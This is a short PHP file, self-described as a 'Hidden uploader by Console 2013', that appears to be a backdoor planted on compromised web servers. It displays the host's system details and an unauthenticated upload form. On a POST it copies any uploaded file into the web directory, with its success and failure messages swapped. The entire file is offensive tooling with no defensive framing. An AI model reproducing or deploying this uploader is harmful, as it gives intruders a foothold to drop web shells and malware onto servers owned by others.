<?php
; echo '<title>Localhost</title>'
; echo '<br><br><br><br><br><br><br><br><br><br><br><br>'
; echo '<style type="text/css">	body {background-color:#fff;}	#q {font: 25px "tahoma";color:lime;}</style>'
; echo '<center><b><br><br><font color"lime">'.php_uname().'<br></b></center></font>'
; echo '<center><font color"lime">uploaderpass : <blink>password@is-root</blink></center></font>'
; echo '<font color"lime"><center>change <blink>none</blink> to uploaderpass can you upload file!</center></font>'
; echo '<style>.upload { display:yes; text-align:center;}.text { display:block;}</style>'
; echo '<body onkeyup="sysH(event); this.select()"><div class="text"></div><div class="upload">'
; echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'
; echo '<input type="file" name="file">&nbsp;<input name="_upl" type="submit" id="_upl" name="ok" value="Browse..."></center></form>'
; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) 
{ echo '<b><center><font color="lime">fail</b></font><br><br></center></font>'
; } else { echo '<b><center><font color="lime"><blink>yes,sukses!</b></font></blink><br><br></center>'
; } }
; echo 'Hidden uploader by Console 2013 &copy;'
?>